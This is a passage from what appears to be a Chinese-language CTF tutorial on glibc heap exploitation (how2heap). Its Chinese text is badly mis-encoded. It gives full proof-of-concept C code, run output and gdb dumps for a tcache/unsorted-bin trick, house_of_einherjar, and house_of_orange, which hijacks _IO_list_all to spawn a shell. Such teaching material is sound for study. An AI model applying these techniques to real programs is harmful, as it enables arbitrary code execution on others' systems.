$ ./a.out
The target we want to rewrite on stack: 0x7ffef0884c10 -&gt; 0

Now, we allocate first small chunk on the heap at: 0x564866907260
Freed the first chunk to put it in a tcache bin
Overwrite the next ptr with the target address
Now we malloc twice to make tcache struct's counts '0xff'

Now free again to put it in unsorted bin
Now write its bk ptr with the target address-0x10: 0x7ffef0884c00

Finally malloc again to get the chunk at target address: 0x7ffef0884c10 -&gt; 0x7f69ba1d8ca0
</code></pre>
<p>æˆ‘ä»¬çŸ¥é“ç”±äºŽ tcache çš„å­˜åœ¨ï¼Œmalloc ä»Ž unsorted bin å– chunk çš„æ—¶å€™ï¼Œå¦‚æžœå¯¹åº”çš„ tcache bin è¿˜æœªè£…æ»¡ï¼Œåˆ™ä¼šå°† unsorted bin é‡Œçš„ chunk å…¨éƒ¨æ”¾è¿›å¯¹åº”çš„ tcache binï¼Œç„¶åŽå†ä»Ž tcache bin ä¸­å–å‡ºã€‚é‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼Œåœ¨æ”¾è¿› tcache bin çš„è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œmalloc ä¼šä»¥ä¸ºæˆ‘ä»¬çš„ target address ä¹Ÿæ˜¯ä¸€ä¸ª chunkï¼Œç„¶è€Œè¿™ä¸ª "chunk" æ˜¯è¿‡ä¸äº†æ£€æŸ¥çš„ï¼Œå°†æŠ›å‡º "memory corruption" çš„é”™è¯¯ï¼š</p>
<pre><code class="language-c">      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))
        {
          bck = victim-&gt;bk;
          if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0)
              || __builtin_expect (chunksize_nomask (victim)
                   &gt; av-&gt;system_mem, 0))
            malloc_printerr (&quot;malloc(): memory corruption&quot;);
</code></pre>
<p>é‚£ä¹ˆè¦æƒ³è·³è¿‡æ”¾ chunk çš„è¿™ä¸ªè¿‡ç¨‹ï¼Œå°±éœ€è¦å¯¹åº” tcache bin çš„ counts åŸŸä¸å°äºŽ tcache_countï¼ˆé»˜è®¤ä¸º7ï¼‰ï¼Œä½†å¦‚æžœ counts ä¸ä¸º 0ï¼Œè¯´æ˜Ž tcache bin é‡Œæ˜¯æœ‰ chunk çš„ï¼Œé‚£ä¹ˆ malloc çš„æ—¶å€™ä¼šç›´æŽ¥ä»Ž tcache bin é‡Œå–å‡ºï¼ŒäºŽæ˜¯å°±æ²¡æœ‰ unsorted bin ä»€ä¹ˆäº‹äº†ï¼š</p>
<pre><code class="language-c">  if (tc_idx &lt; mp_.tcache_bins
      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */
      &amp;&amp; tcache
      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }
</code></pre>
<p>è¿™å°±é€ æˆäº†çŸ›ç›¾ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç§æ—¢èƒ½ä»Ž unsorted bin ä¸­å– chunkï¼Œåˆä¸ä¼šå°† chunk æ”¾è¿› tcache bin çš„åŠžæ³•ã€‚</p>
<p>äºŽæ˜¯å°±å¾—åˆ°äº†ä¸Šé¢çš„åˆ©ç”¨ tcache poisoningï¼ˆå‚è€ƒç« èŠ‚4.14ï¼‰ï¼Œå°† counts ä¿®æ”¹æˆäº† <code>0xff</code>ï¼ŒäºŽæ˜¯åœ¨è¿›è¡Œåˆ°ä¸‹é¢è¿™é‡Œæ—¶å°±ä¼šè¿›å…¥ else åˆ†æ”¯ï¼Œç›´æŽ¥å–å‡º chunk å¹¶è¿”å›žï¼š</p>
<pre><code class="language-c">#if USE_TCACHE
          /* Fill cache first, return to user only if cache fills.
         We may return one of these chunks later.  */
          if (tcache_nb
          &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)
        {
          tcache_put (victim, tc_idx);
          return_cached = 1;
          continue;
        }
          else
        {
#endif
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
</code></pre>
<p>äºŽæ˜¯å°±æˆåŠŸæ³„éœ²å‡ºäº† unsorted bin çš„å¤´éƒ¨åœ°å€ã€‚</p>
<h3 id="house_of_einherjar">house_of_einherjar</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

int main() {
    uint8_t *a, *b, *d;

    a = (uint8_t*) malloc(0x10);
    int real_a_size = malloc_usable_size(a);
    memset(a, 'A', real_a_size);
    fprintf(stderr, &quot;We allocate 0x10 bytes for 'a': %p\n\n&quot;, a);

    size_t fake_chunk[6];
    fake_chunk[0] = 0x80;
    fake_chunk[1] = 0x80;
    fake_chunk[2] = (size_t) fake_chunk;
    fake_chunk[3] = (size_t) fake_chunk;
    fake_chunk[4] = (size_t) fake_chunk;
    fake_chunk[5] = (size_t) fake_chunk;
    fprintf(stderr, &quot;Our fake chunk at %p looks like:\n&quot;, fake_chunk);
    fprintf(stderr, &quot;prev_size: %#lx\n&quot;, fake_chunk[0]);
    fprintf(stderr, &quot;size: %#lx\n&quot;, fake_chunk[1]);
    fprintf(stderr, &quot;fwd: %#lx\n&quot;, fake_chunk[2]);
    fprintf(stderr, &quot;bck: %#lx\n&quot;, fake_chunk[3]);
    fprintf(stderr, &quot;fwd_nextsize: %#lx\n&quot;, fake_chunk[4]);
    fprintf(stderr, &quot;bck_nextsize: %#lx\n\n&quot;, fake_chunk[5]);

    b = (uint8_t*) malloc(0xf8);
    int real_b_size = malloc_usable_size(b);
    uint64_t* b_size_ptr = (uint64_t*)(b - 0x8);
    fprintf(stderr, &quot;We allocate 0xf8 bytes for 'b': %p\n&quot;, b);
    fprintf(stderr, &quot;b.size: %#lx\n&quot;, *b_size_ptr);
    fprintf(stderr, &quot;We overflow 'a' with a single null byte into the metadata of 'b'\n&quot;);
    a[real_a_size] = 0;
    fprintf(stderr, &quot;b.size: %#lx\n\n&quot;, *b_size_ptr);

    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
    *(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size;
    fprintf(stderr, &quot;We write a fake prev_size to the last %lu bytes of a so that it will consolidate with our fake chunk\n&quot;, sizeof(size_t));
    fprintf(stderr, &quot;Our fake prev_size will be %p - %p = %#lx\n\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size);

    fake_chunk[1] = fake_size;
    fprintf(stderr, &quot;Modify fake chunk's size to reflect b's new prev_size\n&quot;);

    fprintf(stderr, &quot;Now we free b and this will consolidate with our fake chunk\n&quot;);
    free(b);
    fprintf(stderr, &quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;, fake_chunk[1]);

    d = malloc(0x10);
    memset(d, 'A', 0x10);
    fprintf(stderr, &quot;\nNow we can call malloc() and it will begin in our fake chunk: %p\n&quot;, d);
}
$ gcc -g house_of_einherjar.c
$ ./a.out
We allocate 0x10 bytes for 'a': 0xb31010

Our fake chunk at 0x7ffdb337b7f0 looks like:
prev_size: 0x80
size: 0x80
fwd: 0x7ffdb337b7f0
bck: 0x7ffdb337b7f0
fwd_nextsize: 0x7ffdb337b7f0
bck_nextsize: 0x7ffdb337b7f0

We allocate 0xf8 bytes for 'b': 0xb31030
b.size: 0x101
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
Our fake prev_size will be 0xb31020 - 0x7ffdb337b7f0 = 0xffff80024d7b5830

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk
Our fake chunk size is now 0xffff80024d7d6811 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk: 0x7ffdb337b800
</code></pre>
<p>house-of-einherjar æ˜¯ä¸€ç§åˆ©ç”¨ malloc æ¥è¿”å›žä¸€ä¸ªé™„è¿‘åœ°å€çš„ä»»æ„æŒ‡é’ˆã€‚å®ƒè¦æ±‚æœ‰ä¸€ä¸ªå•å­—èŠ‚æº¢å‡ºæ¼æ´žï¼Œè¦†ç›–æŽ‰ next chunk çš„ size å­—æ®µå¹¶æ¸…é™¤ <code>PREV_IN_USE</code> æ ‡å¿—ï¼Œç„¶åŽè¿˜éœ€è¦è¦†ç›– prev_size å­—æ®µä¸º fake chunk çš„å¤§å°ã€‚å½“ next chunk è¢«é‡Šæ”¾æ—¶ï¼Œå®ƒä¼šå‘çŽ°å‰ä¸€ä¸ª chunk è¢«æ ‡è®°ä¸ºç©ºé—²çŠ¶æ€ï¼Œç„¶åŽå°è¯•åˆå¹¶å †å—ã€‚åªè¦æˆ‘ä»¬ç²¾å¿ƒæž„é€ ä¸€ä¸ª fake chunkï¼Œè®©åˆå¹¶åŽçš„å †å—èŒƒå›´åˆ° fake chunk å¤„ï¼Œé‚£ä¸‹ä¸€æ¬¡ malloc å°†è¿”å›žæˆ‘ä»¬æƒ³è¦çš„åœ°å€ã€‚æ¯”èµ·å‰é¢æ‰€è®²è¿‡çš„ poison-null-byte ï¼Œæ›´åŠ å¼ºå¤§ï¼Œä½†æ˜¯è¦æ±‚çš„æ¡ä»¶ä¹Ÿæ›´å¤šä¸€ç‚¹ï¼Œæ¯”å¦‚ä¸€ä¸ªå †ä¿¡æ¯æ³„æ¼ã€‚</p>
<p>é¦–å…ˆåˆ†é…ä¸€ä¸ªå‡è®¾å­˜åœ¨ off_by_one æº¢å‡ºçš„ chunk aï¼Œç„¶åŽåœ¨æ ˆä¸Šåˆ›å»ºæˆ‘ä»¬çš„ fake chunkï¼Œchunk å¤§å°éšæ„ï¼Œåªè¦æ˜¯ small chunk å°±å¯ä»¥äº†ï¼š</p>
<pre><code class="language-text">gefâž¤  x/8gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a
0x603010:    0x4141414141414141    0x4141414141414141
0x603020:    0x4141414141414141    0x0000000000020fe1  &lt;-- top chunk
0x603030:    0x0000000000000000    0x0000000000000000
gefâž¤  x/8gx &amp;fake_chunk
0x7fffffffdcb0:    0x0000000000000080    0x0000000000000080  &lt;-- fake chunk
0x7fffffffdcc0:    0x00007fffffffdcb0    0x00007fffffffdcb0
0x7fffffffdcd0:    0x00007fffffffdcb0    0x00007fffffffdcb0
0x7fffffffdce0:    0x00007fffffffddd0    0xffa7b97358729300
</code></pre>
<p>æŽ¥ä¸‹æ¥åˆ›å»º chunk bï¼Œå¹¶åˆ©ç”¨ chunk a çš„æº¢å‡ºå°† size å­—æ®µè¦†ç›–æŽ‰ï¼Œæ¸…é™¤äº† <code>PREV_INUSE</code> æ ‡å¿—ï¼Œchunk b å°±ä¼šä»¥ä¸ºå‰ä¸€ä¸ª chunk æ˜¯ä¸€ä¸ª free chunk äº†ï¼š</p>
<pre><code class="language-text">gefâž¤  x/8gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a
0x603010:    0x4141414141414141    0x4141414141414141
0x603020:    0x4141414141414141    0x0000000000000100  &lt;-- chunk b
0x603030:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>åŽŸæœ¬ chunk b çš„ size å­—æ®µåº”è¯¥ä¸º 0x101ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬é€‰æ‹© malloc(0xf8) ä½œä¸º chunk b ä¹Ÿæ˜¯å‡ºäºŽæ–¹ä¾¿çš„ç›®çš„ï¼Œè¦†ç›–åŽåªå½±å“äº†æ ‡å¿—ä½ï¼Œæ²¡æœ‰å½±å“åˆ°å¤§å°ã€‚</p>
<p>æŽ¥ä¸‹æ¥æ ¹æ® fake chunk åœ¨æ ˆä¸Šçš„ä½ç½®ä¿®æ”¹ chunk b çš„ prev_size å­—æ®µã€‚è®¡ç®—æ–¹æ³•æ˜¯ç”¨ chunk b çš„èµ·å§‹åœ°å€å‡åŽ» fake chunk çš„èµ·å§‹åœ°å€ï¼ŒåŒæ—¶ä¸ºäº†ç»•è¿‡æ£€æŸ¥ï¼Œè¿˜éœ€è¦å°† fake chunk çš„ size å­—æ®µä¸Ž chunk b çš„ prev_size å­—æ®µç›¸åŒ¹é…ï¼š</p>
<pre><code class="language-text">gefâž¤  x/8gx a-0x10
0x603000:    0x0000000000000000    0x0000000000000021  &lt;-- chunk a
0x603010:    0x4141414141414141    0x4141414141414141
0x603020:    0xffff800000605370    0x0000000000000100  &lt;-- chunk b &lt;-- prev_size
0x603030:    0x0000000000000000    0x0000000000000000
gefâž¤  x/8gx &amp;fake_chunk
0x7fffffffdcb0:    0x0000000000000080    0xffff800000605370  &lt;-- fake chunk &lt;-- size
0x7fffffffdcc0:    0x00007fffffffdcb0    0x00007fffffffdcb0
0x7fffffffdcd0:    0x00007fffffffdcb0    0x00007fffffffdcb0
0x7fffffffdce0:    0x00007fffffffddd0    0xadeb3936608e0600
</code></pre>
<p>é‡Šæ”¾ chunk bï¼Œè¿™æ—¶å› ä¸º <code>PREV_INUSE</code> ä¸ºé›¶ï¼Œunlink ä¼šæ ¹æ® prev_size åŽ»å¯»æ‰¾ä¸Šä¸€ä¸ª free chunkï¼Œå¹¶å°†å®ƒå’Œå½“å‰ chunk åˆå¹¶ã€‚ä»Ž arena é‡Œå¯ä»¥çœ‹åˆ°ï¼š</p>
<pre><code class="language-text">gefâž¤  heap arenas
Arena (base=0x7ffff7dd1b20, top=0x7fffffffdcb0, last_remainder=0x0, next=0x7ffff7dd1b20, next_free=0x0, system_mem=0x21000)
</code></pre>
<p>åˆå¹¶çš„è¿‡ç¨‹åœ¨ poison-null-byte é‚£é‡Œä¹Ÿè®²è¿‡äº†ã€‚</p>
<p>æœ€åŽå½“æˆ‘ä»¬å†æ¬¡ mallocï¼Œå…¶è¿”å›žçš„åœ°å€å°†æ˜¯ fake chunk çš„åœ°å€ï¼š</p>
<pre><code class="language-text">gefâž¤  x/8gx &amp;fake_chunk
0x7fffffffdcb0:    0x0000000000000080    0x0000000000000021  &lt;-- chunk d
0x7fffffffdcc0:    0x4141414141414141    0x4141414141414141
0x7fffffffdcd0:    0x00007fffffffdcb0    0xffff800000626331
0x7fffffffdce0:    0x00007fffffffddd0    0xbdf40e22ccf46c00
</code></pre>
<h3 id="house_of_orange">house_of_orange</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int winner (char *ptr);

int main() {
    char *p1, *p2;
    size_t io_list_all, *top;

    p1 = malloc(0x400 - 0x10);

    top = (size_t *) ((char *) p1 + 0x400 - 0x10);
    top[1] = 0xc01;

    p2 = malloc(0x1000);
    io_list_all = top[2] + 0x9a8;
    top[3] = io_list_all - 0x10;

    memcpy((char *) top, &quot;/bin/sh\x00&quot;, 8);

    top[1] = 0x61;

    _IO_FILE *fp = (_IO_FILE *) top;
    fp-&gt;_mode = 0; // top+0xc0
    fp-&gt;_IO_write_base = (char *) 2; // top+0x20
    fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28

    size_t *jump_table = &amp;top[12]; // controlled memory
    jump_table[3] = (size_t) &amp;winner;
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8

    malloc(1);
    return 0;
}

int winner(char *ptr) {
    system(ptr);
    return 0;
}
$ gcc -g house_of_orange.c
$ ./a.out
*** Error in `./a.out': malloc(): memory corruption: 0x00007f3daece3520 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f3dae9957e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f3dae9a013e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3dae9a2184]
./a.out[0x4006cc]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3dae93e830]
./a.out[0x400509]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 919342                             /home/firmy/how2heap/a.out
00600000-00601000 r--p 00000000 08:01 919342                             /home/firmy/how2heap/a.out
00601000-00602000 rw-p 00001000 08:01 919342                             /home/firmy/how2heap/a.out
01e81000-01ec4000 rw-p 00000000 00:00 0                                  [heap]
7f3da8000000-7f3da8021000 rw-p 00000000 00:00 0
7f3da8021000-7f3dac000000 ---p 00000000 00:00 0
7f3dae708000-7f3dae71e000 r-xp 00000000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f3dae71e000-7f3dae91d000 ---p 00016000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f3dae91d000-7f3dae91e000 rw-p 00015000 08:01 398989                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f3dae91e000-7f3daeade000 r-xp 00000000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
7f3daeade000-7f3daecde000 ---p 001c0000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
7f3daecde000-7f3daece2000 r--p 001c0000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
7f3daece2000-7f3daece4000 rw-p 001c4000 08:01 436912                     /lib/x86_64-linux-gnu/libc-2.23.so
7f3daece4000-7f3daece8000 rw-p 00000000 00:00 0
7f3daece8000-7f3daed0e000 r-xp 00000000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so
7f3daeef4000-7f3daeef7000 rw-p 00000000 00:00 0
7f3daef0c000-7f3daef0d000 rw-p 00000000 00:00 0
7f3daef0d000-7f3daef0e000 r--p 00025000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so
7f3daef0e000-7f3daef0f000 rw-p 00026000 08:01 436908                     /lib/x86_64-linux-gnu/ld-2.23.so
7f3daef0f000-7f3daef10000 rw-p 00000000 00:00 0
7ffe8eba6000-7ffe8ebc7000 rw-p 00000000 00:00 0                          [stack]
7ffe8ebee000-7ffe8ebf1000 r--p 00000000 00:00 0                          [vvar]
7ffe8ebf1000-7ffe8ebf3000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
$ whoami
firmy
$ exit
Aborted (core dumped)
</code></pre>
<p>house-of-orange æ˜¯ä¸€ç§åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹ <code>_IO_list_all</code> æŒ‡é’ˆçš„åˆ©ç”¨æ–¹æ³•ã€‚å®ƒè¦æ±‚èƒ½å¤Ÿæ³„æ¼å †å’Œ libcã€‚æˆ‘ä»¬çŸ¥é“ä¸€å¼€å§‹çš„æ—¶å€™ï¼Œæ•´ä¸ªå †éƒ½å±žäºŽ top chunkï¼Œæ¯æ¬¡ç”³è¯·å†…å­˜æ—¶ï¼Œå°±ä»Ž top chunk ä¸­åˆ’å‡ºè¯·æ±‚å¤§å°çš„å †å—è¿”å›žç»™ç”¨æˆ·ï¼ŒäºŽæ˜¯ top chunk å°±è¶Šæ¥è¶Šå°ã€‚</p>
<p>å½“æŸä¸€æ¬¡ top chunk çš„å‰©ä½™å¤§å°å·²ç»ä¸èƒ½å¤Ÿæ»¡è¶³è¯·æ±‚æ—¶ï¼Œå°±ä¼šè°ƒç”¨å‡½æ•° <code>sysmalloc()</code> åˆ†é…æ–°å†…å­˜ï¼Œè¿™æ—¶å¯èƒ½ä¼šå‘ç”Ÿä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯ç›´æŽ¥æ‰©å…… top chunkï¼Œå¦ä¸€ç§æ˜¯è°ƒç”¨ mmap åˆ†é…ä¸€å—æ–°çš„ top chunkã€‚å…·ä½“è°ƒç”¨å“ªä¸€ç§æ–¹æ³•æ˜¯ç”±ç”³è¯·å¤§å°å†³å®šçš„ï¼Œä¸ºäº†èƒ½å¤Ÿä½¿ç”¨å‰ä¸€ç§æ‰©å±• top chunkï¼Œéœ€è¦è¯·æ±‚å°äºŽé˜€å€¼ <code>mp_.mmap_threshold</code>ï¼š</p>
<pre><code class="language-c">  if (av == NULL
      || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)
      &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))
    {
</code></pre>
<p>åŒæ—¶ï¼Œä¸ºäº†èƒ½å¤Ÿè°ƒç”¨ <code>sysmalloc()</code> ä¸­çš„ <code>_int_free()</code>ï¼Œéœ€è¦ top chunk å¤§äºŽ <code>MINSIZE</code>ï¼Œå³ 0x10ï¼š</p>
<pre><code class="language-c">                      if (old_size &gt;= MINSIZE)
                        {
                          _int_free (av, old_top, 1);
                        }
</code></pre>
<p>å½“ç„¶ï¼Œè¿˜å¾—ç»•è¿‡ä¸‹é¢ä¸¤ä¸ªé™åˆ¶æ¡ä»¶ï¼š</p>
<pre><code class="language-c">  /*
     If not the first time through, we require old_size to be
     at least MINSIZE and to have prev_inuse set.
   */

  assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||
          ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;
           prev_inuse (old_top) &amp;&amp;
           ((unsigned long) old_end &amp; (pagesize - 1)) == 0));

  /* Precondition: not enough current space to satisfy nb request */
  assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE));
</code></pre>
<p>å³æ»¡è¶³ old_size å°äºŽ <code>nb+MINSIZE</code>ï¼Œ<code>PREV_INUSE</code> æ ‡å¿—ä½ä¸º 1ï¼Œ<code>old_top+old_size</code> é¡µå¯¹é½è¿™å‡ ä¸ªæ¡ä»¶ã€‚</p>
<p>é¦–å…ˆåˆ†é…ä¸€ä¸ªå¤§å°ä¸º 0x400 çš„ chunkï¼š</p>
<pre><code class="language-text">gefâž¤  x/4gx p1-0x10
0x602000:    0x0000000000000000    0x0000000000000401  &lt;-- chunk p1
0x602010:    0x0000000000000000    0x0000000000000000
gefâž¤  x/4gx p1-0x10+0x400
0x602400:    0x0000000000000000    0x0000000000020c01  &lt;-- top chunk
0x602410:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œtop chunk å¤§å°ä¸º 0x21000ï¼Œå‡åŽ» 0x400ï¼Œæ‰€ä»¥æ­¤æ—¶çš„å¤§å°ä¸º 0x20c00ï¼Œå¦å¤– PREV_INUSE è¢«è®¾ç½®ã€‚</p>
<p>çŽ°åœ¨å‡è®¾å­˜åœ¨æº¢å‡ºæ¼æ´žï¼Œå¯ä»¥ä¿®æ”¹ top chunk çš„æ•°æ®ï¼ŒäºŽæ˜¯æˆ‘ä»¬å°† size å­—æ®µä¿®æ”¹ä¸º 0xc01ã€‚è¿™æ ·å°±å¯ä»¥æ»¡è¶³ä¸Šé¢æ‰€è¯´çš„æ¡ä»¶ï¼š</p>
<pre><code class="language-text">gefâž¤  x/4gx p1-0x10+0x400
0x602400:    0x0000000000000000    0x0000000000000c01  &lt;-- top chunk
0x602410:    0x0000000000000000    0x0000000000000000
</code></pre>
<p>ç´§æŽ¥ç€ï¼Œç”³è¯·ä¸€å—å¤§å†…å­˜ï¼Œæ­¤æ—¶ç”±äºŽä¿®æ”¹åŽçš„ top chunk size ä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œåˆ™è°ƒç”¨ sysmalloc çš„ç¬¬ä¸€ç§æ–¹æ³•æ‰©å…… top chunkï¼Œç»“æžœæ˜¯åœ¨ old_top åŽé¢æ–°å»ºäº†ä¸€ä¸ª top chunk ç”¨æ¥å­˜æ”¾ new_topï¼Œç„¶åŽå°† old_top é‡Šæ”¾ï¼Œå³è¢«æ·»åŠ åˆ°äº† unsorted bin ä¸­ï¼š</p>
<pre><code class="language-text">gefâž¤  x/4gx p1-0x10+0x400
0x602400:    0x0000000000000000    0x0000000000000be1  &lt;-- old top chunk [be freed]
0x602410:    0x00007ffff7dd1b78    0x00007ffff7dd1b78      &lt;-- fd, bk pointer
gefâž¤  x/4gx p1-0x10+0x400+0xbe0
0x602fe0:    0x0000000000000be0    0x0000000000000010  &lt;-- fencepost chunk 1
0x602ff0:    0x0000000000000000    0x0000000000000011  &lt;-- fencepost chunk 2
gefâž¤  x/4gx p2-0x10
0x623000:    0x0000000000000000    0x0000000000001011  &lt;-- chunk p2
0x623010:    0x0000000000000000    0x0000000000000000
gefâž¤  x/4gx p2-0x10+0x1010
0x624010:    0x0000000000000000    0x0000000000020ff1  &lt;-- new top chunk
0x624020:    0x0000000000000000    0x0000000000000000
gefâž¤  heap bins unsorted
[ Unsorted Bin for arena 'main_arena' ]
[+] unsorted_bins[0]: fw=0x602400, bk=0x602400
 â†’   Chunk(addr=0x602410, size=0xbe0, flags=PREV_INUSE)
</code></pre>
<p>äºŽæ˜¯å°±æ³„æ¼å‡ºäº† libc åœ°å€ã€‚å¦å¤–å¯ä»¥çœ‹åˆ° old top chunk è¢«ç¼©å°äº† 0x20ï¼Œç¼©å°çš„ç©ºé—´è¢«ç”¨äºŽæ”¾ç½® fencepost chunkã€‚æ­¤æ—¶çš„å †ç©ºé—´åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="language-text">+---------------+
|       p1      |
+---------------+
|  old top-0x20 |
+---------------+
|  fencepost 1  |
+---------------+
|  fencepost 2  |
+---------------+
|      ...      |
+---------------+
|       p2      |
+---------------+
|    new top    |
+---------------+
</code></pre>
<p>è¯¦ç»†è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<pre><code class="language-c">                  if (old_size != 0)
                    {
                      /*
                         Shrink old_top to insert fenceposts, keeping size a
                         multiple of MALLOC_ALIGNMENT. We know there is at least
                         enough space in old_top to do this.
                       */
                      old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;
                      set_head (old_top, old_size | PREV_INUSE);

                      /*
                         Note that the following assignments completely overwrite
                         old_top when old_size was previously MINSIZE.  This is
                         intentional. We need the fencepost, even if old_top otherwise gets
                         lost.
                       */
                      chunk_at_offset (old_top, old_size)-&gt;size =
                        (2 * SIZE_SZ) | PREV_INUSE;

                      chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size =
                        (2 * SIZE_SZ) | PREV_INUSE;

                      /* If possible, release the rest. */
                      if (old_size &gt;= MINSIZE)
                        {
                          _int_free (av, old_top, 1);
                        }
                    }
</code></pre>
<p>æ ¹æ®æ”¾å…¥ unsorted bin ä¸­ old top chunk çš„ fd/bk æŒ‡é’ˆï¼Œå¯ä»¥æŽ¨ç®—å‡º <code>_IO_list_all</code> çš„åœ°å€ã€‚ç„¶åŽé€šè¿‡æº¢å‡ºå°† old top çš„ bk æ”¹å†™ä¸º <code>_IO_list_all-0x10</code>ï¼Œè¿™æ ·åœ¨è¿›è¡Œ unsorted bin attack æ—¶ï¼Œå°±ä¼šå°† <code>_IO_list_all</code> ä¿®æ”¹ä¸º <code>&amp;unsorted_bin-0x10</code>ï¼š</p>
<pre><code class="language-c">          /* remove from unsorted list */
          unsorted_chunks (av)-&gt;bk = bck;
          bck-&gt;fd = unsorted_chunks (av);
gefâž¤  x/4gx p1-0x10+0x400
0x602400:    0x0000000000000000    0x0000000000000be1
0x602410:    0x00007ffff7dd1b78    0x00007ffff7dd2510
</code></pre>
<p>è¿™é‡Œè®²ä¸€ä¸‹ glibc ä¸­çš„å¼‚å¸¸å¤„ç†ã€‚ä¸€èˆ¬åœ¨å‡ºçŽ°å†…å­˜é”™è¯¯æ—¶ï¼Œä¼šè°ƒç”¨å‡½æ•° <code>malloc_printerr()</code> æ‰“å°å‡ºé”™ä¿¡æ¯ï¼Œæˆ‘ä»¬é¡ºç€ä»£ç ä¸€ç›´è·Ÿè¸ªä¸‹åŽ»ï¼š</p>
<pre><code class="language-c">static void
malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)
{
  [...]
  if ((action &amp; 5) == 5)
    __libc_message (action &amp; 2, &quot;%s\n&quot;, str);
  else if (action &amp; 1)
    {
      char buf[2 * sizeof (uintptr_t) + 1];

      buf[sizeof (buf) - 1] = '\0';
      char *cp = _itoa_word ((uintptr_t) ptr, &amp;buf[sizeof (buf) - 1], 16, 0);
      while (cp &gt; buf)
        *--cp = '0';

      __libc_message (action &amp; 2, &quot;*** Error in `%s': %s: 0x%s ***\n&quot;,
                      __libc_argv[0] ? : &quot;&lt;unknown&gt;&quot;, str, cp);
    }
  else if (action &amp; 2)
    abort ();
}
</code></pre>
<p>è°ƒç”¨ <code>__libc_message</code>ï¼š</p>
<pre><code class="language-c">// sysdeps/posix/libc_fatal.c
/* Abort with an error message.  */
void
__libc_message (int do_abort, const char *fmt, ...)
{
  [...]
  if (do_abort)
    {
      BEFORE_ABORT (do_abort, written, fd);

      /* Kill the application.  */
      abort ();
    }
}
</code></pre>
<p><code>do_abort</code> è°ƒç”¨ <code>fflush</code>ï¼Œå³ <code>_IO_flush_all_lockp</code>ï¼š</p>
<pre><code class="language-c">// stdlib/abort.c
#define fflush(s) _IO_flush_all_lockp (0)

  if (stage == 1)
    {
      ++stage;
      fflush (NULL);
    }
// libio/genops.c
int
_IO_flush_all_lockp (int do_lock)
{
  int result = 0;
  struct _IO_FILE *fp;
  int last_stamp;

#ifdef _IO_MTSAFE_IO
  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
  if (do_lock)
    _IO_lock_lock (list_all_lock);
#endif

  last_stamp = _IO_list_all_stamp;
  fp = (_IO_FILE *) _IO_list_all;   // å°†å…¶è¦†ç›–
  while (fp != NULL)
    {
      run_fp = fp;
      if (do_lock)
    _IO_flockfile (fp);

      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
       || (_IO_vtable_offset (fp) == 0
